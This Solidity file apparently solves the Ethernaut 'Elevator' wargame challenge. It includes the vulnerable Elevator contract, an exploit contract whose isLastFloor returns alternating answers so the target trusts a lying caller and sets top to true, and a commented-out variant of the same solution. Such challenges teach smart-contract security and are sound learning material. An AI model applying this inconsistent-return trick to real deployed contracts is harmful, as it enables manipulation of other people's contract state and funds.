// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
function isLastFloor(uint) external returns (bool);
}

contract HackElevator is Building {
    bool flip = true;
    function isLastFloor(uint) public returns (bool){
        flip = !flip;
        return flip;
    }

    function hackIt(address _address) external{
        Elevator elevator = Elevator(_address);
        elevator.goTo(uint(3));
    }
}

// ANOTHER SOLUTION THAT WORKS
// interface Floor {
// function isLastFloor(uint) external returns (bool);
// }

// contract Building is Floor {
//     bool flip = true;
//     function isLastFloor(uint) public returns (bool){
//         flip = !flip;
//         return flip;
//     }

//     function hackIt(address _address) external{
//         Elevator elevator = Elevator(_address);
//         elevator.goTo(uint(3));
//     }
// }


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}